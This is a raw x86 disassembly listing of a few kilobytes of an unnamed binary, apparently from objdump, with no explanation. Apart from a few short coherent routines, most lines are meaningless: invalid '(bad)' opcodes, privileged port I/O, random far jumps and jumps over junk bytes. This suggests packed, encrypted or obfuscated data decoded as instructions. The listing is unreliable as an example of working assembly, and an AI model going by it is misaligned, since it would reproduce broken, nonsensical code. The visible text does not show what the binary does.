  4051f8:	enter  0x98c2,0xf3
  4051fc:	sub    DWORD PTR [eax+eiz*8-0x152e0503],esp
  405203:	push   esi
  405204:	pop    eax
  405205:	and    dl,ch
  405207:	ficomp WORD PTR [eax]
  405209:	ins    DWORD PTR es:[edi],dx
  40520a:	loop   0x4051ad
  40520c:	mov    DWORD PTR [edx],eax
  40520e:	pop    edx
  40520f:	loope  0x4051c3
  405211:	out    0xe9,eax
  405213:	inc    ebx
  405214:	lahf   
  405215:	mov    ds:0xb71e37ae,al
  40521a:	pop    edx
  40521b:	mov    esp,0x5744d904
  405220:	stos   DWORD PTR es:[edi],eax
  405221:	xor    bl,0x4c
  405224:	sbb    BYTE PTR [eax],0xeb
  405227:	in     al,dx
  405228:	mov    esp,0xe9f61a68
  40522d:	(bad)  
  40522e:	call   0xf7cf:0x393dfea5
  405235:	jge    0x405263
  405237:	data16 aas 
  405239:	push   ebx
  40523a:	xchg   ebx,eax
  40523b:	mov    DWORD PTR [ebp+0xc],eax
  40523e:	mov    eax,DWORD PTR [ebp-0x4]
  405241:	mov    esi,DWORD PTR [ebp-0x8]
  405244:	xor    eax,edx
  405246:	xor    esi,edx
  405248:	add    eax,ecx
  40524a:	add    esi,ecx
  40524c:	imul   eax,esi
  40524f:	mov    esi,DWORD PTR [ebp+0xc]
  405252:	cmp    esi,eax
  405254:	mov    eax,DWORD PTR [ebp-0x4]
  405257:	je     0x405025
  40525d:	xor    eax,edx
  40525f:	add    eax,ecx
  405261:	mov    ecx,DWORD PTR [ebp+0xc]
  405264:	imul   eax,ecx
  405267:	add    eax,DWORD PTR [ebp+0x8]
  40526a:	mov    DWORD PTR [ebp+0xc],eax
  40526d:	mov    eax,DWORD PTR [ebp+0xc]
  405270:	pop    esi
  405271:	leave  
  405272:	ret    0x8
  405275:	push   ebp
  405276:	mov    ebp,esp
  405278:	push   ecx
  405279:	jmp    0x4055dc
  40527e:	sahf   
  40527f:	jb     0x40520d
  405281:	push   edx
  405282:	pop    esp
  405283:	jl     0x4052ed
  405285:	jb     0x405286
  405287:	ret    
  405288:	mov    ebx,0x2f719339
  40528d:	xor    DWORD PTR [ebx+0x2a],ebx
  405290:	jle    0x405310
  405292:	les    edi,FWORD PTR [ecx+0x7e]
  405295:	jle    0x4052a0
  405297:	cli    
  405298:	push   ds
  405299:	clc    
  40529a:	aas    
  40529b:	pop    esi
  40529c:	xor    dl,BYTE PTR [eax]
  40529e:	(bad)  
  40529f:	scas   al,BYTE PTR es:[edi]
  4052a0:	idiv   eax
  4052a2:	pop    ss
  4052a3:	imul   edi,edi,0x823fdc30
  4052a9:	cmp    DWORD PTR [edx+0x52],edi
  4052ac:	mov    cl,0x30
  4052ae:	add    eax,0x8db9c450
  4052b3:	cwde   
  4052b4:	sub    eax,0x961f8cf
  4052b9:	test   DWORD PTR ds:0xea9dc940,edx
  4052bf:	mov    eax,0x12518ed1
  4052c4:	stos   DWORD PTR es:[edi],eax
  4052c5:	aaa    
  4052c6:	fild   WORD PTR [ecx+ebp*4]
  4052c9:	div    DWORD PTR [ecx-0x4a3b51e9]
  4052cf:	sub    BYTE PTR [esi+0x4e9d6ca8],cl
  4052d5:	push   esp
  4052d6:	rcl    BYTE PTR [edi+0x69],1
  4052d9:	test   al,0xa0
  4052db:	es mov bh,0x4d
  4052de:	or     al,0xae
  4052e0:	in     eax,0xf1
  4052e2:	pop    es
  4052e3:	jecxz  0x4052ea
  4052e5:	xchg   esi,eax
  4052e6:	bound  edx,QWORD PTR [ecx-0x5376c2d3]
  4052ec:	inc    esi
  4052ed:	(bad)  
  4052ef:	lea    edi,[ebp-0x5a]
  4052f2:	xor    eax,0xc51d1040
  4052f7:	pop    ebp
  4052f8:	mov    edi,0x44aee289
  4052fd:	pop    eax
  4052fe:	mov    ch,0x8c
  405300:	pushf  
  405301:	hlt    
  405302:	ins    BYTE PTR es:[edi],dx
  405303:	in     al,dx
  405304:	out    0x14,eax
  405306:	lods   eax,DWORD PTR ds:[esi]
  405307:	mov    bh,0x17
  405309:	scas   eax,DWORD PTR es:[edi]
  40530a:	sub    DWORD PTR [ecx-0x1fb6a4c8],eax
  405310:	pop    ebx
  405311:	das    
  405312:	hlt    
  405313:	ds sbb al,0x2b
  405316:	pop    edi
  405317:	pop    eax
  405318:	mov    ch,0x9d
  40531a:	sbb    DWORD PTR [esi],edx
  40531c:	mov    bl,0x9a
  40531e:	in     eax,dx
  40531f:	mov    al,ds:0xba2914ef
  405324:	gs ret 0x8682
  405328:	pop    ds
  405329:	push   ebp
  40532a:	into   
  40532b:	sbb    cl,dl
  40532d:	iret   
  40532e:	mov    DWORD PTR [ecx+ecx*4],0xadf518aa
  405335:	push   esp
  405336:	(bad)  
  405338:	mov    esi,0x9026006e
  40533d:	adc    BYTE PTR [esp+ebx*1],ch
  405340:	push   edx
  405341:	fs push edx
  405343:	cmc    
  405344:	test   eax,eax
  405346:	sub    cl,BYTE PTR [eiz*4+0x441e4fc8]
  40534d:	dec    esi
  40534e:	push   0x7c
  405350:	pop    esi
  405351:	jno    0x4053ac
  405353:	adc    dl,BYTE PTR [ebx+0x10793ae4]
  405359:	mov    bh,0x32
  40535b:	fs stos BYTE PTR es:[edi],al
  40535d:	xchg   edi,eax
  40535e:	xor    eax,0x958e19e1
  405363:	imul   ebx,DWORD PTR [edx-0x216cb29e],0x929655da
  40536d:	in     al,0x56
  40536f:	mov    dh,0xd6
  405371:	fwait
  405372:	sti    
  405373:	ss retf 0x1c55
  405377:	push   cs
  405378:	cs fwait
  40537a:	xor    ah,BYTE PTR [ebp+0x7a]
  40537d:	popa   
  40537e:	mov    esi,0x9c5b03c8
  405383:	test   BYTE PTR [esi],cl
  405385:	out    dx,al
  405386:	mov    al,ds:0xcf209960
  40538b:	mov    ah,0x60
  40538d:	in     eax,0xe3
  40538f:	mov    ds:0xe3a69d33,al
  405394:	inc    ebp
  405395:	mov    ebp,0x4bc25c81
  40539a:	adc    eax,0x44227824
  40539f:	iret   
  4053a0:	in     al,0xd4
  4053a2:	sbb    DWORD PTR [eax+0x11d7ffaf],esi
  4053a8:	cmp    eax,0x1430d0b4
  4053ad:	lea    esp,[edx-0x7606721c]
  4053b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053b4:	sbb    al,0xe9
  4053b6:	rcl    BYTE PTR [edx+0x5f],cl
  4053b9:	fst    QWORD PTR [ecx+0x58ae7edc]
  4053bf:	sbb    al,0x40
  4053c1:	addr16 aaa 
  4053c3:	dec    ebx
  4053c4:	xor    esi,DWORD PTR [edx-0x4d]
  4053c7:	retf   0x6f68
  4053ca:	add    BYTE PTR ds:0x865ac41c,al
  4053d0:	sub    ah,al
  4053d2:	mul    BYTE PTR [eax]
  4053d4:	inc    ecx
  4053d5:	aaa    
  4053d6:	add    al,0x21
  4053d8:	shr    DWORD PTR [ecx-0x67],1
  4053db:	mov    bh,0xba
  4053dd:	push   ebp
  4053de:	je     0x4053dc
  4053e0:	or     ebp,DWORD PTR [ecx-0x770ab67e]
  4053e6:	and    BYTE PTR [eax],dl
  4053e8:	mov    bh,0x9b
  4053ea:	scas   al,BYTE PTR es:[edi]
  4053eb:	ss cli 
  4053ed:	(bad)  
  4053ee:	mov    bh,0xce
  4053f0:	push   0x4f
  4053f2:	popf   
  4053f3:	mov    ebx,0x3821e3a2
  4053f8:	jno    0x4053e2
  4053fa:	or     ch,BYTE PTR [edi-0x72]
  4053fd:	mov    ebp,0xaeafef55
  405402:	(bad)  
  405403:	out    0x46,eax
  405405:	(bad)  
  405406:	pop    ebx
  405407:	mov    WORD PTR [ebp+0x42346e24],ss
  40540d:	and    al,0x64
  40540f:	mov    bh,0x79
  405411:	xor    al,dh
  405413:	jo     0x405403
  405415:	xchg   ebx,eax
  405416:	sub    BYTE PTR [edx-0x44668783],ah
  40541c:	or     edx,ecx
  40541e:	xchg   esp,eax
  40541f:	adc    BYTE PTR [ebp-0x5ec5ae58],0xf0
  405426:	mov    ds:0xedb6678a,al
  40542b:	aad    0xb3
  40542d:	sbb    eax,0x18177928
  405432:	test   BYTE PTR [ecx+0x7d],dh
  405435:	dec    ecx
  405436:	push   ds
  405437:	or     al,0x99
  405439:	dec    ecx
  40543a:	sub    eax,0x3beda4b9
  40543f:	and    ebx,DWORD PTR [edx+0x700c9d42]
  405445:	mov    al,ds:0x79e74a69
  40544a:	or     ah,BYTE PTR [esi-0x9]
  40544d:	adc    eax,0xd87a707d
  405452:	cmp    eax,ecx
  405454:	pop    edi
  405455:	dec    edi
  405456:	enter  0xa0b9,0xe3
  40545a:	jle    0x405469
  40545c:	jb     0x4053e9
  40545e:	test   eax,0xb1255cc3
  405463:	stos   BYTE PTR es:[edi],al
  405464:	leave  
  405465:	out    0xef,eax
  405467:	mov    esi,0x5b6dd92e
  40546c:	fsubr  st(7),st
  40546e:	sub    DWORD PTR [eax+0x5612285],ebp
  405474:	ins    DWORD PTR es:[edi],dx
  405475:	sbb    dh,dh
  405477:	jl     0x40547b
  405479:	repnz lods al,BYTE PTR ds:[esi]
  40547b:	xchg   edx,eax
  40547c:	inc    ebx
  40547d:	jns    0x4054bc
  40547f:	jl     0x405428
  405481:	mov    ds:0xb04d3abc,eax
  405486:	fcompp 
  405488:	adc    cl,BYTE PTR [eax+eiz*2+0x76ac75a8]
  40548f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405490:	out    0x69,al
  405492:	push   edx
  405493:	pop    ss
  405494:	and    bl,bh
  405496:	or     al,0xce
  405498:	xor    BYTE PTR [ebx],bh
  40549a:	lods   eax,DWORD PTR ds:[esi]
  40549b:	push   ecx
  40549c:	outs   dx,DWORD PTR ds:[esi]
  40549d:	mov    cl,0x45
  40549f:	dec    eax
  4054a0:	inc    edx
  4054a1:	add    DWORD PTR ds:0x53a1ca09,esp
  4054a7:	lods   eax,DWORD PTR ds:[esi]
  4054a8:	cld    
  4054a9:	fidivr WORD PTR [ebp-0x2bb0851c]
  4054af:	aas    
  4054b0:	cmp    esp,DWORD PTR [esi]
  4054b2:	lds    esi,FWORD PTR [ecx-0x10]
  4054b5:	bound  ebp,QWORD PTR [edi]
  4054b7:	out    dx,eax
  4054b8:	mov    al,ds:0xda450192
  4054bd:	repz cdq 
  4054bf:	or     al,0xc
  4054c1:	sub    eax,DWORD PTR [edi]
  4054c3:	mov    esp,0x7aff7aa4
  4054c8:	adc    eax,0x38e4e037
  4054cd:	out    dx,al
  4054ce:	(bad)  
  4054cf:	add    DWORD PTR [esi],0x31
  4054d2:	add    eax,DWORD PTR [edi]
  4054d4:	mov    bl,0x13
  4054d6:	enter  0x45b1,0xd7
  4054da:	inc    ecx
  4054db:	inc    ebx
  4054dc:	xchg   DWORD PTR [ebx+0x7a],eax
  4054df:	jmp    0xa89c:0xffd067ff
  4054e6:	cld    
  4054e7:	or     eax,0x80a2d649
  4054ec:	mov    bl,0x2e
  4054ee:	add    BYTE PTR [edi-0x46],al
  4054f1:	sbb    BYTE PTR [esi-0x34],dl
  4054f4:	ficom  DWORD PTR ds:0x957ac780
  4054fa:	mov    cl,0xd8
  4054fc:	pop    edi
  4054fd:	gs daa 
  4054ff:	xchg   ebx,eax
  405500:	jae    0x405555
  405502:	xlat   BYTE PTR ds:[ebx]
  405503:	(bad)  
  405504:	aas    
  405505:	lods   al,BYTE PTR ds:[esi]
  405506:	adc    DWORD PTR [ebx+0x5cb3c006],eax
  40550c:	jae    0x4054c1
  40550e:	(bad)  
  40550f:	arpl   di,sp
  405511:	shr    BYTE PTR [eax+edx*4],1
  405514:	sbb    eax,0xf7449816
  405519:	lods   al,BYTE PTR cs:[esi]
  40551b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40551c:	ret    0xdba4
  40551f:	cmp    BYTE PTR [esi+eiz*8+0x4bbcf6a],bl
  405526:	sar    ch,0xb8
  405529:	adc    BYTE PTR [edi+esi*8+0x15],bl
  40552d:	fisttp QWORD PTR [esi+0x35]
  405530:	adc    esi,esp
  405532:	jne    0x405535
  405534:	leave  
  405535:	cld    
  405536:	leave  
  405537:	iret   
  405538:	adc    al,bl
  40553a:	dec    edx
  40553b:	jb     0x405578
  40553d:	push   ss
  40553e:	(bad)  
  40553f:	repz pop ds
  405541:	cli    
  405542:	sbb    al,0x15
  405544:	sub    esp,esp
  405546:	es sub al,0x27
  405549:	out    0x72,al
  40554b:	cmp    edx,esp
  40554d:	stc    
  40554e:	in     al,dx
  40554f:	cld    
  405550:	xchg   edx,eax
  405551:	and    DWORD PTR [esp+ecx*1-0x7c7b5676],ecx
  405558:	fistp  QWORD PTR [esi]
  40555a:	ja     0x40558c
  40555c:	cld    
  40555d:	test   BYTE PTR [edi-0x5fc64578],al
  405563:	sub    dh,BYTE PTR [ebx-0x22]
  405566:	dec    esp
  405567:	xchg   esp,eax
  405568:	sbb    DWORD PTR [ecx],0x130a664f
  40556e:	or     BYTE PTR ds:[esi+0x22],ch
  405572:	jne    0x405588
  405574:	inc    ecx
  405575:	jae    0x405593
  405577:	push   cs
  405578:	xchg   esi,eax
  405579:	(bad)  
  40557a:	sub    BYTE PTR [esi+0x349e51b2],0xfc
  405581:	add    ah,cl
  405583:	or     cl,dh
  405585:	push   ecx
  405586:	popf   
  405587:	jae    0x4055d6
  405589:	jo     0x4055b6
  40558b:	call   0x612d43d1
  405590:	fst    DWORD PTR [esi]
  405592:	enter  0x60dc,0x36
  405596:	sbb    ebp,ebp
  405598:	mov    ecx,0x7c10af56
  40559d:	inc    ebp
  40559e:	daa    
  40559f:	sahf   
  4055a0:	and    BYTE PTR [ebp-0x408308fd],0xd7
  4055a7:	sti    
  4055a8:	dec    edi
  4055a9:	push   eax
  4055aa:	push   edi
  4055ab:	fcomp  QWORD PTR [edx-0x26e627ec]
  4055b1:	lods   eax,DWORD PTR ds:[esi]
  4055b2:	fs sub al,0x18
  4055b6:	sahf   
  4055b7:	adc    esp,DWORD PTR [edi]
  4055b9:	iret   
  4055ba:	(bad)  
  4055bb:	push   0x13ce3452
  4055c0:	mov    eax,0x360ace71
  4055c5:	xchg   edi,eax
  4055c6:	jb     0x40559e
  4055c8:	(bad)  
  4055c9:	sti    
  4055ca:	mov    esi,0xe56a1c08
  4055cf:	ds call 0xe5bd:0xdfb375de
  4055d7:	fiadd  DWORD PTR [ebp*4-0x47ae3b87]
  4055de:	lahf   
  4055df:	cld    
  4055e0:	mov    ds:0xfc458905,eax
  4055e5:	mov    DWORD PTR ds:0x434573,0x3619
  4055ef:	mov    ecx,DWORD PTR [ebp-0x4]
  4055f2:	jmp    0x405955
  4055f7:	xchg   esi,eax
  4055f8:	jb     0x405627
  4055fa:	jg     0x4055e9
  4055fc:	dec    ecx
  4055fd:	mov    esp,0x8b1aac73
  405602:	cs mov ebx,0x21ae5999
  405608:	ss jle 0x405689
  40560b:	les    edi,FWORD PTR [ecx+0x7e]
  40560e:	jle    0x405672
  405610:	pop    ebx
  405611:	(bad)  
  405612:	jmp    0xb52f:0xc1870067
  405619:	xor    eax,0xfb588349
  40561e:	inc    edx
  40561f:	js     0x4055e7
  405621:	scas   eax,DWORD PTR es:[edi]
  405622:	mov    ds:0xfa4679c5,al
  405627:	add    cl,BYTE PTR [ebx]
  405629:	scas   eax,DWORD PTR es:[edi]
  40562a:	pop    esi
  40562b:	ret    0xdd82
  40562e:	jne    0x4055bd
  405630:	mov    eax,0x7fe1cd4
  405635:	xor    DWORD PTR [eax-0x60fe9f08],esi
  40563b:	inc    esp
  40563c:	arpl   WORD PTR [edi-0x3ff36d6a],bp
  405642:	xchg   BYTE PTR [edi-0x4b],dl
  405645:	inc    ecx
  405646:	jnp    0x4055e5
  405648:	(bad)  
  405649:	icebp  
  40564a:	fdivp  st(1),st
  40564c:	fwait
  40564d:	int    0x52
  40564f:	mov    ds:0x420dfa2d,al
  405654:	xchg   ecx,eax
  405655:	pop    edi
  405656:	test   eax,0x183c9d80
  40565b:	es jl  0x4055e0
  40565e:	pop    eax
  40565f:	cmp    BYTE PTR [ecx+0x6b6f1989],bl
  405665:	sub    al,0x34
  405667:	pop    esp
  405668:	adc    eax,0xa7041dbe
  40566d:	stos   DWORD PTR es:[edi],eax
  40566e:	mov    ch,0x6c
  405670:	invd   
  405672:	pop    ds
  405673:	xchg   esi,eax
  405674:	mov    cl,0x6d
  405676:	scas   al,BYTE PTR es:[edi]
  405677:	push   ebx
  405678:	push   ecx
  405679:	aad    0xc0
  40567b:	dec    esp
  40567c:	add    eax,0xa3853c51
  405681:	sub    eax,edi
  405683:	mov    dh,0x72
  405685:	mov    edi,DWORD PTR [ecx+0x76a1b2bf]
  40568b:	test   DWORD PTR [ebx+0x38],esp
  40568e:	mov    ebp,0x5b4152da
  405693:	xchg   esp,eax
  405694:	jge    0x4056f0
  405696:	test   al,0x4
  405698:	jmp    0x3ba5:0x63b0e2a2
  40569f:	sbb    DWORD PTR [esp+ebp*4+0xad0af1e],ebx
  4056a6:	and    al,0xa3
  4056a8:	sub    esp,ebx
  4056aa:	pop    es
  4056ab:	fidiv  WORD PTR ds:[eax]
  4056ae:	shl    BYTE PTR [ebx-0x52],0xe3
  4056b2:	mov    cl,0x35
  4056b4:	xchg   ebp,eax
  4056b5:	shl    DWORD PTR [ecx+0x4c4304ac],cl
  4056bb:	icebp  
  4056bc:	dec    ebp
  4056bd:	xchg   DWORD PTR [ebx-0x4d],edi
  4056c0:	xor    eax,0x6bf626b7
  4056c5:	mov    WORD PTR [edx+ebx*4-0x12dba77a],ds
  4056cc:	xchg   esi,eax
  4056cd:	mov    ds:0xe1ccd893,al
  4056d2:	fs and al,0xfd
  4056d5:	jmp    0xfc64:0xee66f017
  4056dc:	sbb    dh,bl
  4056de:	ret    0x7539
  4056e1:	lea    esi,[ebp+0x325f701b]
  4056e7:	adc    bl,ah
  4056e9:	mov    al,ds:0xfea0a0f2
  4056ee:	stos   DWORD PTR es:[edi],eax
  4056ef:	mov    ecx,0x4036d075
  4056f4:	pop    ds
  4056f5:	jne    0x405729
  4056f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056f8:	adc    al,0x33
  4056fa:	jmp    0x92229cdf
  4056ff:	in     al,dx
  405700:	cmp    DWORD PTR [edi],eax
  405702:	jg     0x4056ae
  405704:	xlat   BYTE PTR ds:[ebx]
  405705:	mov    ah,0x48
  405707:	int3   
  405708:	inc    ebx
  405709:	and    esp,DWORD PTR [ebx+edi*1-0xee0c527]
  405710:	(bad)  
  405711:	pop    ebx
  405712:	lock fwait
  405714:	and    eax,0x363cbb26
  405719:	mov    al,ds:0x6211f6e4
  40571e:	push   esi
  40571f:	pop    ebx
  405720:	nop
  405721:	loop   0x40572e
  405723:	mov    ds:0xff71402c,eax
  405728:	mov    esi,0x2e442bbb
  40572d:	div    DWORD PTR [edx+esi*1]
  405730:	mov    BYTE PTR [ebp+0x26],dl
  405733:	js     0x4056ed
  405735:	rep lods al,BYTE PTR ds:[esi]
  405737:	clc    
  405738:	mov    dl,0xbc
  40573a:	rol    DWORD PTR [esi+ecx*4+0x4ae307a],0x2
  405742:	imul   DWORD PTR [edx+0x6c]
  405745:	xchg   BYTE PTR [esi+ebx*2-0x2a],ah
  405749:	mov    edx,0xe564c4fa
  40574e:	ret    
  40574f:	or     eax,0x1056cde6
  405754:	popf   
  405755:	mov    esi,ebp
  405757:	fidiv  WORD PTR [ebx-0x74]
  40575a:	and    al,BYTE PTR [esi+0x23ef08d4]
  405760:	sti    
  405761:	das    
  405762:	ret    0x2ab0
  405765:	add    ecx,DWORD PTR [ebx]
  405767:	vcvtsi2ss xmm1,xmm6,DWORD PTR [edi+0xad681e1]
  40576f:	pop    eax
  405770:	fs push eax
  405772:	jo     0x4057e1
  405774:	cmp    BYTE PTR [eax],0x10
  405777:	push   edx
  405778:	cdq    
  405779:	aaa    
  40577a:	scas   eax,DWORD PTR es:[edi]
  40577b:	xchg   ebp,eax
  40577c:	ins    BYTE PTR es:[edi],dx
  40577d:	mov    cl,0x64
  40577f:	icebp  
  405780:	mov    eax,0x20fb6b63
  405785:	loope  0x405736
  405787:	sub    BYTE PTR [edi+0x8],0xf8
  40578b:	test   eax,0x4239aa68
  405790:	or     al,0x65
  405792:	add    ah,BYTE PTR [edx-0x2da8dc6e]
  405798:	ss sti 
  40579a:	ror    BYTE PTR [ebp-0x45],0xa
  40579e:	sub    esi,0x63
  4057a1:	call   0x50d2:0x99914fac
  4057a8:	(bad)  [edi+ebx*8-0x67134aa4]
  4057af:	ret    
  4057b0:	add    DWORD PTR [ecx],edx
  4057b2:	push   esi
  4057b3:	xor    DWORD PTR [esi+0x2b],0xa00977d0
  4057ba:	ret    0x1c3a
  4057bd:	or     dh,dh
  4057bf:	ins    BYTE PTR es:[edi],dx
  4057c0:	test   eax,0x5f266029
  4057c5:	in     al,0xbf
  4057c7:	test   DWORD PTR [esi+0x6420b996],0xf311b785
  4057d1:	cmp    edx,eax
  4057d3:	mov    bh,0x6e
  4057d5:	jg     0x405833
  4057d7:	sub    ah,ah
  4057d9:	pop    edi
  4057da:	test   BYTE PTR [eax],dh
  4057dc:	and    BYTE PTR [ebx+0x54],cl
  4057df:	loope  0x405796
  4057e1:	push   ebp
  4057e2:	push   0xba5a5ee2
  4057e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057e8:	icebp  
  4057e9:	outs   dx,DWORD PTR ds:[esi]
  4057ea:	lahf   
  4057eb:	xor    dh,BYTE PTR [edi]
  4057ed:	or     eax,ecx
  4057ef:	mov    al,0xea
  4057f1:	inc    ebp
  4057f2:	push   ebp
  4057f3:	div    DWORD PTR [esi+0x4bceb2e0]
  4057f9:	sub    al,0x3e
  4057fb:	adc    BYTE PTR [eax+0x11cb12c4],al
  405801:	push   edi
  405802:	sti    
  405803:	sbb    ebx,ecx
  405805:	lahf   
  405806:	inc    eax
  405807:	mov    ah,0x57
  405809:	mov    esp,0x80798f8c
  40580e:	push   ebp
  40580f:	mov    dl,0xcb
  405811:	fsub   QWORD PTR [ebx]
  405813:	imul   ecx,ebp,0xffffff8a
  405816:	pop    edx
  405817:	fisubr DWORD PTR [eax]
  405819:	les    ebp,FWORD PTR [esi-0x162b67b2]
  40581f:	mov    dl,BYTE PTR [edi]
  405821:	stos   BYTE PTR es:[edi],al
  405822:	cmp    al,0xb6
  405824:	inc    esp
  405825:	pop    esi
  405826:	or     esp,DWORD PTR [edx+0x42]
  405829:	or     ch,BYTE PTR [ecx+ebx*1+0x2f]
  40582d:	and    eax,0x25169896
  405832:	mov    DWORD PTR [eax],edx
  405834:	aam    0x5a
  405836:	data16 fcmove st,st(1)
  405839:	rol    esi,0x74
  40583c:	xor    ebp,eax
  40583e:	out    0x82,eax
  405840:	test   eax,0xdd56c5e5
  405845:	nop
  405846:	mov    ds,WORD PTR [ecx-0x5d24933c]
  40584c:	mov    ah,0x9d
  40584e:	stos   BYTE PTR es:[edi],al
  40584f:	jecxz  0x405888
  405851:	das    
  405852:	inc    ebx
  405853:	inc    esi
  405854:	lods   eax,DWORD PTR ds:[esi]
  405855:	gs icebp 
  405857:	cmp    al,0xa8
  405859:	and    BYTE PTR [esi+0x62],bl
  40585c:	jbe    0x405863
  40585e:	dec    ebp
  40585f:	test   DWORD PTR [ecx],esi
  405861:	(bad)  
  405862:	jo     0x4058a1
  405864:	cmp    eax,ecx
  405866:	add    ah,0x61
  405869:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40586a:	pop    edx
  40586b:	gs pushf 
  40586d:	repnz lahf 
  40586f:	mov    ah,0x10
  405871:	(bad)  
  405872:	out    0xd2,al
  405874:	push   ds
  405875:	sar    BYTE PTR [esp-0x33],cl
  405879:	dec    ecx
  40587a:	cmp    esp,DWORD PTR [esi]
  40587c:	sub    edx,DWORD PTR [esi]
  40587e:	fisttp DWORD PTR [edx+ecx*1]
  405881:	pop    ebp
  405882:	daa    
  405883:	dec    esp
  405884:	dec    esp
  405885:	out    dx,al
  405886:	jo     0x4058ad
  405888:	push   ebx
  405889:	mov    eax,0xb4c876a9
  40588e:	daa    
  40588f:	mov    ds:0xfb589d42,al
  405894:	(bad)  
  405895:	sbb    BYTE PTR [ebp+ecx*4-0x8],ch
  405899:	and    eax,0x5b01236f
  40589e:	cdq    
  40589f:	clc    
  4058a0:	xlat   BYTE PTR ds:[ebx]
  4058a1:	into   
  4058a2:	pop    ss
  4058a3:	stc    
  4058a4:	js     0x4058c6
  4058a6:	ss std 
  4058a8:	ror    DWORD PTR [esi-0x33],0xc4
  4058ac:	out    dx,eax
  4058ad:	xlat   BYTE PTR ds:[ebx]
  4058ae:	inc    ecx
  4058af:	and    eax,0xf089692f
  4058b4:	dec    edi
  4058b5:	sahf   
  4058b6:	dec    esi
  4058b7:	jge    0x40583f
  4058b9:	not    BYTE PTR [ebx+0x4b]
  4058bc:	popa   
  4058bd:	adc    DWORD PTR ds:0xe914de32,ecx
  4058c3:	in     eax,dx
  4058c4:	fsub   st,st(4)
  4058c6:	jge    0x4058b5
  4058c8:	adc    BYTE PTR ds:0x5ed76018,ch
  4058ce:	inc    esi
  4058cf:	mov    DWORD PTR [esi+0x21],ebp
  4058d2:	cld    
  4058d3:	js     0x4058e5
  4058d5:	pushf  
  4058d6:	push   0xffffff8a
  4058d8:	jno    0x405891
  4058da:	mov    al,0x8f
  4058dc:	cmp    ebp,DWORD PTR [ecx-0x73]
  4058df:	xchg   ebp,eax
  4058e0:	ss in  eax,dx
  4058e2:	adc    ch,BYTE PTR [ebx+0x4d5a3d6]
  4058e8:	sub    al,0x4f
  4058ea:	xor    eax,0xe3126f18
  4058ef:	jne    0x40588d
  4058f1:	dec    eax
  4058f2:	out    dx,eax
  4058f3:	stos   DWORD PTR es:[edi],eax
  4058f4:	xchg   BYTE PTR [esi],al
  4058f6:	and    bl,dh
  4058f8:	dec    edi
  4058f9:	dec    ebx
  4058fa:	or     eax,0x4d20ac67
  4058ff:	jno    0x40595a
  405901:	mov    ebx,0x78203485
  405906:	mov    esi,0xaf0a0015
  40590b:	add    DWORD PTR ds:0xb2853f75,0xcdcecc2
  405915:	(bad)  
  405916:	lods   eax,DWORD PTR ds:[esi]
  405917:	and    al,0x77
  405919:	ret    
  40591a:	mov    ecx,0x8628935d
  40591f:	rcl    DWORD PTR [eax-0x4be27868],cl
  405925:	inc    esi
  405926:	push   eax
  405927:	ins    BYTE PTR es:[edi],dx
  405928:	neg    BYTE PTR [eax+0x75]
  40592b:	aad    0x91
  40592d:	jp     0x405906
  40592f:	jb     0x4059ac
  405931:	cmp    BYTE PTR [ebp+0x26],bh
  405934:	push   DWORD PTR [eax]
  405936:	dec    ebx
  405937:	jbe    0x40590b
  405939:	dec    esp
  40593a:	cmp    BYTE PTR [esi],0x1b
  40593d:	mov    ebp,0x2068db
  405942:	add    esp,DWORD PTR [ecx]
  405944:	jmp    0x405949
  405946:	mov    cl,0xe5
  405948:	mov    esp,0x849aa323
  40594d:	jle    0x405911
  40594f:	add    ah,BYTE PTR [edi+0x18]
  405952:	cmp    al,0x40
  405954:	push   edx
  405955:	mov    DWORD PTR [ebp-0x8],0x4f39
  40595c:	mov    DWORD PTR ds:0x434653,0x224a
  405966:	jmp    0x405cc9
  40596b:	mov    edx,0x71b8a1ab
  405970:	pop    esp
  405971:	arpl   WORD PTR [ebp-0x4d872e44],si
  405977:	mov    ch,0xd2
  405979:	cmc    
  40597a:	mov    ebp,0x7e7e31ef
  40597f:	les    edi,FWORD PTR [ecx+0x7e]
  405982:	jle    0x405998
  405984:	ins    BYTE PTR es:[edi],dx
  405985:	and    cl,cl
  405987:	add    al,0x13
  405989:	xor    BYTE PTR [ecx],bh
  40598b:	call   0xbbc1:0x8ebe2d6
  405992:	mov    bh,0x90
  405994:	dec    esp
  405995:	add    al,BYTE PTR [ecx-0x1c]
  405998:	inc    esp
  405999:	shl    eax,cl
  40599b:	test   BYTE PTR [eax+0x39859737],ch
  4059a1:	hlt    
  4059a2:	xchg   DWORD PTR ds:0xa11a515e,ebp
  4059a8:	mov    bh,0x99
  4059aa:	dec    esp
  4059ab:	pop    esp
  4059ac:	int3   
  4059ad:	test   DWORD PTR [esi],esp
  4059af:	pop    esp
  4059b0:	dec    edi
  4059b1:	push   esi
  4059b2:	sub    al,0xe0
  4059b4:	mov    esi,0x68b9f0fb
  4059b9:	pop    ebx
  4059ba:	iret   
  4059bb:	shl    cl,1
  4059bd:	lea    ebx,[edx+0x6eb03d0e]
  4059c3:	push   ebp
  4059c4:	jnp    0x4059c4
  4059c6:	mov    edx,0xf3678ecb
  4059cb:	xor    al,0x82
  4059cd:	or     eax,0xc38bd5b1
  4059d2:	pop    esi
  4059d3:	mov    BYTE PTR [eax-0x14],al
  4059d6:	pop    eax
  4059d7:	fdivr  DWORD PTR [ebx+0x327c2ea8]
  4059dd:	cmp    DWORD PTR [edx+0x59529438],esp
  4059e3:	lea    edx,[ecx+0x1b871401]
  4059e9:	dec    ecx
  4059eb:	cmp    BYTE PTR [edi+ebp*8+0x6d328a9c],bl
  4059f2:	mov    ch,0x9d
  4059f4:	loop   0x405a59
  4059f6:	pop    es
  4059f7:	pop    ebx
  4059f8:	dec    edx
  4059f9:	jnp    0x405a15
  4059fb:	shl    BYTE PTR [esi+eiz*4+0x8],1
  4059ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a00:	mov    dl,0x84
  405a02:	sub    bl,dh
  405a04:	add    ecx,DWORD PTR ds:0xdac4f035
  405a0a:	loope  0x405a75
  405a0c:	mov    ch,BYTE PTR [esi-0x1d759c06]
  405a12:	jne    0x405a45
  405a14:	add    BYTE PTR [esi+0x4f614597],dh
  405a1a:	test   eax,0xbb603d6f
  405a1f:	and    al,0xf2
  405a21:	pop    edx
